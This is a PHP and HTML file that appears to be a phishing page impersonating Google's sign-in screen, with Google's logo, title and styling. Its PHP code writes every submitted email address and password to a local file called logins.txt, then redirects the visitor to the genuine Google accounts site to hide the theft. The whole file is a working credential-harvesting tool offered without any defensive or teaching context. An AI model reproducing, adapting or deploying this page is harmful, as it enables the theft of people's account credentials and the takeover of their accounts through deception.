<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $file = fopen("logins.txt", "a");
    fwrite($file, "Google | Email: " . $_POST["email"] . " | Password: " . $_POST["password"] . "\n");
    fclose($file);
    header("Location: https://accounts.google.com/");
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in – Google Accounts</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            text-align: center;
        }
        .container {
            width: 320px;
            margin: 100px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
        }
        .container img {
            width: 80px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        button {
            width: 95%;
            padding: 10px;
            background: #4285F4;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #357AE8;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo">
        <h2>Sign in</h2>
        <form method="POST">
            <input type="text" name="email" placeholder="Email or phone" required><br>
            <input type="password" name="password" placeholder="Enter your password" required><br>
            <button type="submit">Next</button>
        </form>
        <div class="footer">
            <p><a href="https://accounts.google.com/signin/recovery">Forgot password?</a></p>
        </div>
    </div>
</body>
</html>
